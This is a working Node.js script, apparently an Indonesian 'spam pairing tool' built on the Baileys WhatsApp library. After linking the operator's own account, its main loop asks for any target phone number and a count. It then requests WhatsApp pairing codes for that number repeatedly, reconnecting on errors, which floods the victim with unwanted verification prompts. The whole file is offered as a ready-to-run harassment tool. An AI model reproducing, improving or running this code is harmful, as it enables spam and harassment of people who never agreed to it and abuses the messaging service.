const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// Bagian ini (color, wColor, xColor) tidak berubah
const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

// Fungsi question (tidak berubah)
const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, (ans) => { rl.close(); resolve(ans); }));
};

// Fungsi normalizePhoneNumber (tidak berubah)
function normalizePhoneNumber(input) {
    let num = input.replace(/[^\d]/g, '');
    if (num.startsWith('0')) num = '62' + num.slice(1);
    if (num.startsWith('+62')) num = '62' + num.slice(3);
    return num;
}

// Fungsi delay (tidak berubah)
const delay = (ms) => new Promise(res => setTimeout(res, ms));

// Fungsi loadingSpinner (tidak berubah)
async function loadingSpinner(text, duration = 2000, interval = 100) {
    const frames = ['⠸', '⠴', '⠦', '⠧'];
    let i = 0;
    const start = Date.now();
    while (Date.now() - start < duration) {
        process.stdout.write(`\r${text} ${frames[i % frames.length]} `);
        await delay(interval);
        i++;
    }
    process.stdout.write('\r' + ' '.repeat(50) + '\r');
}


// ==================================================
// === FUNGSI connectWhatsApp YANG DIPERBARUI ===
// ==================================================
async function connectWhatsApp() {
    let retryCount = 0;
    const maxRetries = 5;
    const retryDelay = 5000;
    
    // Loop ini hanya untuk percobaan koneksi awal
    while (retryCount < maxRetries) {
        try {
            // FIX 1: Dapatkan 'saveCreds' dari useMultiFileAuthState
            const { state, saveCreds } = await useMultiFileAuthState('./LUCIFER/session');
            
            const LuciferBot = makeWASocket({
                logger: pino({ level: "silent" }),
                printQRInTerminal: false, // Benar, kita pakai pairing code
                auth: state,
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 0,
                keepAliveIntervalMs: 10000,
                emitOwnEvents: true,
                fireInitQueries: true,
                generateHighQualityLinkPreview: true,
                syncFullHistory: true,
                markOnlineOnConnect: true,
                browser: ["Ubuntu", "Chrome", "20.0.04"],
            });
            
            // FIX 2: Daftarkan 'saveCreds' untuk menyimpan sesi
            LuciferBot.ev.on('creds.update', saveCreds);

            // FIX 3: Tambahkan Logika Pairing jika Bot Belum Terdaftar
            if (!LuciferBot.authState.creds.registered) {
                console.log(wColor + 'Bot Anda belum terdaftar. Silakan masukkan nomor HP bot Anda (Contoh: 62812...):' + xColor);
                let botNumber = await question(wColor + 'Nomor Bot Anda: ' + xColor);
                botNumber = normalizePhoneNumber(botNumber);
                
                if (!botNumber.startsWith('62')) {
                    console.log('❌ Harap gunakan nomor Indonesia (awalan 62) untuk bot Anda.');
                    throw new Error('Nomor bot tidak valid'); // Ini akan memicu retry
                }
                
                console.log(wColor + 'Meminta kode pairing untuk ' + botNumber + '...' + xColor);
                await delay(2000); // Beri waktu user untuk membaca
                
                try {
                    const code = await LuciferBot.requestPairingCode(botNumber);
                    console.log(wColor + 'Kode pairing Anda: ' + code.match(/.{1,4}/g).join('-') + xColor);
                    console.log(wColor + 'Silakan masukkan kode ini di WhatsApp Anda (Tautkan perangkat > Tautkan dengan nomor telepon)' + xColor);
                } catch (pairError) {
                    console.error(wColor + 'Gagal meminta kode pairing:', pairError.message + xColor);
                    throw pairError; // Memicu retry
                }
            }
            
            // FIX 4: Modifikasi handler 'connection.update'
            LuciferBot.ev.on('connection.update', (update) => {
                const { connection, lastDisconnect } = update;
                if (connection === 'close') {
                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                    if (shouldReconnect) {
                        // HANYA LOG. Jangan panggil connectWhatsApp() di sini.
                        // Fungsi 'handleReconnect' di 'LuciferXSatanic' yang akan menangani ini jika terjadi error.
                        console.log(wColor + `\nKoneksi terputus: ${lastDisconnect?.error?.message}. Menunggu auto-reconnect dari handler utama...` + xColor);
                    } else {
                        console.log(wColor + '\nPerangkat keluar. Hapus folder "LUCIFER/session" dan mulai ulang.' + xColor);
                        process.exit(0); // Keluar jika di-logout
                    }
                } else if (connection === 'open') {
                    console.log(wColor + '\nBerhasil terhubung ke WhatsApp!' + xColor);
                    // Tampilkan nama bot saat pertama kali terhubung
                    if (LuciferBot.user) {
                         console.log(wColor + 'Login sebagai:', LuciferBot.user.name || LuciferBot.user.verifiedName || LuciferBot.user.id, xColor);
                    }
                    retryCount = 0; // Reset hitungan retry jika berhasil
                }
            });

            // FIX 5: Tunggu sampai koneksi 'open' sebelum mengembalikan bot
            // Ini penting agar 'LuciferXSatanic' tidak berjalan sebelum bot siap
            await new Promise((resolve, reject) => {
                const eventListener = (update) => {
                    const { connection, lastDisconnect } = update;
                    if (connection === 'open') {
                        LuciferBot.ev.off('connection.update', eventListener); // Hapus listener
                        resolve(true);
                    } else if (connection === 'close') {
                        LuciferBot.ev.off('connection.update', eventListener); // Hapus listener
                        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {
                            reject(new Error('Perangkat keluar.'));
                        } else {
                            // Biarkan loop 'while' di 'connectWhatsApp' yang menangani ini
                            reject(lastDisconnect?.error || new Error('Koneksi ditutup.'));
                        }
                    }
                };
                
                // Batas waktu jika user tidak memasukkan kode pairing
                const timeout = setTimeout(() => {
                    LuciferBot.ev.off('connection.update', eventListener);
                    reject(new Error('Waktu tunggu koneksi habis (60 detik).'));
                }, 60000); // 60 detik

                LuciferBot.ev.on('connection.update', eventListener);
            });
            
            // Jika kita sampai di sini, koneksi sudah 'open'
            return LuciferBot; // Kembalikan bot yang sudah terhubung

        } catch (error) {
            retryCount++;
            console.error(wColor + `Koneksi gagal (percobaan ${retryCount}/${maxRetries}):`, error.message + xColor);
            if (retryCount >= maxRetries) {
                // Biarkan loop berakhir dan lempar error di luar
            } else {
                await delay(retryDelay); // Tunggu sebelum mencoba lagi
            }
        }
    }
    
    // Jika loop 'while' gagal setelah maxRetries
    throw new Error('Gagal terhubung setelah beberapa kali percobaan');
}
// ==================================================
// === AKHIR FUNGSI connectWhatsApp ===
// ==================================================


// Fungsi LuciferXSatanic (tidak ada perubahan signifikan di sini)
async function LuciferXSatanic() {
    try {
        let LuciferBot = await connectWhatsApp();
        
        const handleReconnect = async () => {
            console.log(wColor + '\nMenyambung ulang...' + xColor);
            try {
                LuciferBot = await connectWhatsApp();
                return true;
            } catch (error) {
                console.error('Koneksi ulang gagal:', error.message);
                return false;
            }
        };

        while (true) {
            console.clear();
            console.log(wColor + `
 • スパムペアリングツール
 • 作成者: Hazel
 • 使用注意
┏❐
┃ [ 以下の指示に従ってください ]
┃
┃⭔ Masukkan Nomor | Jumlah (Contoh: 62xxx | 20)
┃⭔ Ketik "exit" kapan saja untuk keluar
┗❐
` + xColor);

            try {
                let userInput = await question(wColor + 'Masukkan Nomor | Jumlah (Contoh: 628123 | 20) : ' + xColor);
                
                if (userInput.toLowerCase() === 'exit') {
                    console.log('Keluar...');
                    process.exit(0);
                }

                const parts = userInput.split('|');
                if (parts.length !== 2) {
                    console.log('❌ Format salah. Harap gunakan format: NOMOR | JUMLAH');
                    await delay(2000);
                    continue; 
                }

                let rawNumber = parts[0].trim();
                let rawCount = parts[1].trim(); 

                let phoneNumber = normalizePhoneNumber(rawNumber);
                if (!phoneNumber.startsWith('62')) {
                    console.log('❌ Harap gunakan nomor Indonesia (awalan 62).');
                    await delay(2000);
                    continue;
                }

                const LuciferCodes = parseInt(rawCount);
                if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
                    console.log('❌ Jumlah spam tidak valid. Contoh: 20');
                    await delay(2000);
                    continue;
                }

                for (let i = 0; i < LuciferCodes; i++) {
                    try {
                        await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                        let code = await LuciferBot.requestPairingCode(phoneNumber);
                        code = code?.match(/.{1,4}/g)?.join("-") || code;
                        // Log sukses sekarang juga menampilkan kodenya (opsional)
                        console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}] | Kode: ${code}` + xColor);
                    } catch (error) {
                        console.error('エラー:', error.message);
                        // Jika error terjadi (misal koneksi putus), panggil handleReconnect
                        const reconnected = await handleReconnect();
                        if (!reconnected) {
                            console.log('Gagal menyambung ulang, keluar...');
                            break; // Keluar dari loop for
                        }
                        // Jika berhasil, ulangi iterasi yang gagal
                        i--; 
                        await delay(3000); // Beri jeda setelah reconnect
                    }
                    await delay(5000); // Jeda antar pengiriman
                }

                if (LuciferCodes > 0) {
                    console.log('\nSelesai! Menunggu input baru...');
                }
                await delay(3000);

            } catch (error) {
                console.error('エラーが発生しました', error.message);
                const reconnected = await handleReconnect();
                if (!reconnected) break; // Keluar dari loop while(true) jika reconnect gagal
                await delay(3000);
            }
        }
    } catch (error) {
        console.error('Fatal error:', error.message);
        process.exit(1);
    }
}

LuciferXSatanic();

